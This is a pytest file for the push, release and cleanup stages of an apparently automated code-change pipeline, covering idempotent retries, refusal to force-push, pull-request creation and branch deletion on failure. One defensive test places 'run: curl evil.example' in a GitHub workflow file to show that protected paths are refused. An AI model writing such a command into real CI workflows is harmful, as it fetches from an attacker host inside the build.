"""The Push node and the branch-write path underneath it — ADR 0007.

These tests need neither Temporal nor podman: what is under test is the node and the SCM
adapter, and the fake platform holds real branch and commit state so the create-versus-update
decision is actually exercised rather than assumed.

The property that most needs a test is the one with no visible symptom. A push that is not
idempotent still works — it just leaves two identical commits on the branch after a Temporal
retry, which nobody notices until a reviewer asks why the same change was made twice.
"""

from __future__ import annotations

import json
import uuid

import httpx
import pytest

from engine.activities.nodes import RUNTIME
from engine.adapters.credentials import EnvCredentialBroker
from engine.config import AppConfig, parse
from engine.errors import AdapterError, ProtectedPathWritten
from engine.nodes import NODES
from engine.nodes.base import bound
from engine.state import Diff, FileChange, FlowState, ProposedEdit, Ticket
from tests.conftest import KUWARDEN_YAML, FakePlatform

BRANCH = "kuwarden/pay-1-deadbeef"
BASE = "base000"


def _state(paths: dict[str, str] | None = None) -> FlowState:
    files = paths or {"src/app.py": "def add(a, b):\n    return a + b\n"}
    return FlowState(
        run_id=uuid.uuid4(),
        root_run_id=uuid.uuid4(),
        ticket=Ticket(id="PAY-1", system="jira", title="add a helper", body="."),
        policy_commit="0" * 40,
        policy_bundle={},
        branch=BRANCH,
        base_branch="main",
        base_commit=BASE,
        proposed_edits=[ProposedEdit(path=p, content=c) for p, c in files.items()],
        diff=Diff(files=[FileChange(path=p, added=1, removed=0) for p in files]),
    )


async def _push(state: FlowState) -> FlowState:
    with bound(RUNTIME.context()):
        return await NODES["push"](state)


async def _release(state: FlowState) -> FlowState:
    with bound(RUNTIME.context()):
        return await NODES["release"](state)


async def test_the_first_push_creates_the_branch(platform: FakePlatform) -> None:
    state = await _push(_state())

    assert platform.branches[BRANCH] == state.head_commit
    assert platform.commits[str(state.head_commit)]["parents"] == [BASE]
    assert any(
        r.method == "POST" and r.url.path.endswith("/git/refs") for r in platform.requests
    ), "a branch that does not exist is created, not patched"


async def test_a_second_attempt_extends_the_branch_rather_than_replacing_it(
    platform: FakePlatform,
) -> None:
    """The branch is a history of attempts. A force-push would erase the earlier one.

    `push_attempt`, not `retry_count`. This test used to set the latter and passed, while
    production silently did not push at all: the flow set `retry_count` for the outer cycle,
    the Coder's inner loop overwrote it from 0 on the very next node, and the commit message
    — whose `kuwarden-attempt` trailer is the idempotency key — came out identical. The
    adapter matched it against the branch tip and returned without pushing.

    Setting the field by hand is what hid it. The test asserted the mechanism worked when
    given a changed counter; nothing asserted the counter actually changed.
    """
    state = await _push(_state())
    first = state.head_commit

    state.push_attempt = 1
    state = await _push(state)

    assert state.head_commit != first
    assert platform.commits[str(state.head_commit)]["parents"] == [first], (
        "the second attempt parents on the first"
    )
    assert platform.branches[BRANCH] == state.head_commit
    patched = [
        r for r in platform.requests if r.method == "PATCH" and "/git/refs/heads/" in r.url.path
    ]
    assert patched, "an existing branch is fast-forwarded"


async def test_the_tree_of_every_attempt_is_built_from_the_pinned_base(
    platform: FakePlatform,
) -> None:
    """Otherwise a file changed in attempt 1 and untouched in attempt 2 survives on the branch.

    It would then be on the branch CI runs against while being absent from the diff Build &
    Test graded — the two would disagree about what the change even is.
    """
    state = await _push(_state())
    state.push_attempt = 1
    await _push(state)

    trees = [r for r in platform.requests if r.url.path.endswith("/git/trees")]
    assert len(trees) == 2
    assert all(json.loads(r.content)["base_tree"] == "tree-base" for r in trees)


async def test_a_retried_activity_does_not_push_the_same_commit_twice(
    platform: FakePlatform,
) -> None:
    """Temporal re-runs an activity whose effect landed but whose acknowledgement was lost.

    The retry is handed the *same* input state — `head_commit` is still unset, because the
    mutation never made it back — so the adapter has to recognise its own work on the branch.
    """
    state = _state()
    first = await _push(state)
    # A genuine retry: the identical input, not the state the first call returned.
    again = await _push(_state_like(state))

    assert again.head_commit == first.head_commit
    assert len(platform.commits) == 1, "a retry must not add a second identical commit"


def _state_like(state: FlowState) -> FlowState:
    """A fresh copy of `state` as the activity would receive it on a retry."""
    return FlowState(
        run_id=state.run_id,
        root_run_id=state.root_run_id,
        ticket=state.ticket,
        policy_commit=state.policy_commit,
        policy_bundle=state.policy_bundle,
        branch=state.branch,
        base_branch=state.base_branch,
        base_commit=state.base_commit,
        proposed_edits=list(state.proposed_edits),
        diff=state.diff,
    )


async def test_a_branch_that_moved_is_refused_rather_than_overwritten(
    platform: FakePlatform,
) -> None:
    """Something else wrote here. Force-pushing over it destroys evidence, so we stop."""
    platform.branches[BRANCH] = "somebody-elses-commit"

    with pytest.raises(AdapterError, match="refusing to overwrite"):
        await _push(_state())


async def test_a_protected_path_is_refused_before_anything_reaches_origin(
    platform: FakePlatform,
) -> None:
    """Invariant 10, at the earliest point that matters.

    A workflow file that reaches origin is executable *there*, whatever KuWarden decides
    afterwards. Checking it only at Build & Test was already too late once the push moved
    ahead of it.
    """
    with pytest.raises(ProtectedPathWritten, match=".github/workflows"):
        await _push(_state({".github/workflows/ci.yml": "run: curl evil.example"}))

    assert not platform.branches, "nothing was created"
    assert not platform.commits, "and nothing was committed"


async def test_the_commit_message_carries_the_run_and_the_attempt(
    platform: FakePlatform,
) -> None:
    """ADR 0003 §7 for the run id; the attempt is what makes the message an idempotency key."""
    state = await _push(_state())
    message = str(platform.commits[str(state.head_commit)]["message"])

    assert f"kuwarden-run-id: {state.run_id}" in message
    assert f"kuwarden-policy-commit: {state.policy_commit}" in message
    assert "kuwarden-attempt: 0" in message
    # Named for when it is read. Final tiering happens after the Coder loop, so the tier in a
    # commit trailer is provisional and must not claim otherwise.
    assert "kuwarden-risk-tier-at-push: low" in message


async def test_release_refuses_a_branch_nobody_pushed(platform: FakePlatform) -> None:
    """A pull request for an unpushed branch asks a human to review nothing."""
    with pytest.raises(AdapterError, match="no pushed branch"):
        await _release(_state())

    assert not platform.pull_requests


async def test_release_opens_one_pull_request_against_the_pinned_base(
    platform: FakePlatform,
) -> None:
    state = await _push(_state())
    state = await _release(state)

    assert len(platform.pull_requests) == 1
    pull_request = platform.pull_requests[0]
    assert pull_request["head"] == BRANCH
    # The branch pinned at the Coder, not whatever `default_branch` answers now.
    assert pull_request["base"] == "main"
    assert str(state.head_commit) in str(pull_request["body"])
    assert [a.kind for a in state.artifacts] == ["commit", "pull_request"]


# --- compensation --------------------------------------------------------------------------


async def _compensate(state: FlowState) -> FlowState:
    with bound(RUNTIME.context()):
        return await NODES["compensate"](state)


async def test_a_failed_run_deletes_the_branch_it_pushed(platform: FakePlatform) -> None:
    """Otherwise every failed run leaves a `kuwarden/*` branch on the customer's remote."""
    state = await _push(_state())
    assert BRANCH in platform.branches

    state = await _compensate(state)

    assert BRANCH not in platform.branches
    assert "deleted" in str(state.cleanup)


async def test_a_branch_with_a_pull_request_is_kept(platform: FakePlatform) -> None:
    """Deleting is destroying evidence.

    Once a pull request exists a human is involved, and removing the branch under them takes
    away the thing they were asked to look at — that is not tidying.
    """
    state = await _push(_state())
    state = await _release(state)

    state = await _compensate(state)

    assert BRANCH in platform.branches
    assert "kept" in str(state.cleanup)


async def test_compensation_never_raises(platform: FakePlatform) -> None:
    """It runs *because* something already went wrong.

    A failure here that propagated would replace a diagnosable original error with a
    confusing second one, and the run would end reporting the wrong cause.
    """
    state = await _push(_state())
    # Point at a repository the fake platform has no route for, so the delete fails.
    platform.branches.clear()

    def refuse(request: httpx.Request) -> httpx.Response:
        return httpx.Response(500, text="the platform is having a bad day")

    RUNTIME.configure(
        _config(),
        broker=EnvCredentialBroker({"KUWARDEN_SCM_TOKEN": "gh-t"}),
        transport=httpx.MockTransport(refuse),
        sandbox=None,
    )
    state = await _compensate(state)

    assert "could not be deleted" in str(state.cleanup), "recorded, not raised"


async def test_nothing_pushed_means_nothing_to_clean(platform: FakePlatform) -> None:
    state = _state()
    state = await _compensate(state)
    assert state.cleanup is None


def _config() -> AppConfig:
    """The suite's application, parsed fresh — the fixture's copy is bound to its transport."""
    return parse(KUWARDEN_YAML)


async def test_a_change_that_only_deletes_a_file_is_still_a_change(
    platform: FakePlatform,
) -> None:
    """A removal is an edit, and Push must send it rather than refuse the run.

    Push used to guard on `state.proposed_edits`, which carried only content-bearing entries:
    `read_changes` read the git-computed diff — which does report deletions — and then dropped
    anything failing `is_file()`. A change that only removed files therefore arrived carrying
    nothing and was refused with "push reached with no proposed edits", indistinguishable from
    the Coder having produced no change at all.
    """
    state = _state()
    state.proposed_edits = [ProposedEdit(path="src/dead.py", content="", deleted=True)]
    state.diff = Diff(files=[FileChange(path="src/dead.py", added=0, removed=12)])

    pushed = await _push(state)

    assert platform.branches[BRANCH] == pushed.head_commit, "the deletion reached origin"
    trees = [
        json.loads(r.content)
        for r in platform.requests
        if r.method == "POST" and r.url.path.endswith("/git/trees")
    ]
    assert trees, "a tree was written"
    entry = next(e for e in trees[-1]["tree"] if e["path"] == "src/dead.py")
    # A null sha against `base_tree` is how the trees API removes a path. An empty blob would
    # push an emptied file, which is a different change and leaves its imports resolving.
    assert entry["sha"] is None, "a deletion is a null sha, never an empty blob"
    assert not any(
        r.method == "POST" and r.url.path.endswith("/git/blobs") for r in platform.requests
    ), "no blob is created for a file that is being removed"


async def test_an_empty_diff_is_refused_by_name_rather_than_as_a_missing_edit(
    platform: FakePlatform,
) -> None:
    """The run still fails, but the message names the cause instead of the symptom.

    "push reached with no proposed edits" pointed a reader at Push, three nodes downstream of
    a Coder that had been shown the wrong files and correctly declined to guess.
    """
    state = _state()
    state.proposed_edits = []
    state.diff = Diff(files=[])

    with pytest.raises(AdapterError) as failure:
        await _push(state)

    assert "the Coder produced no change" in str(failure.value)
    assert not platform.branches, "nothing was pushed"
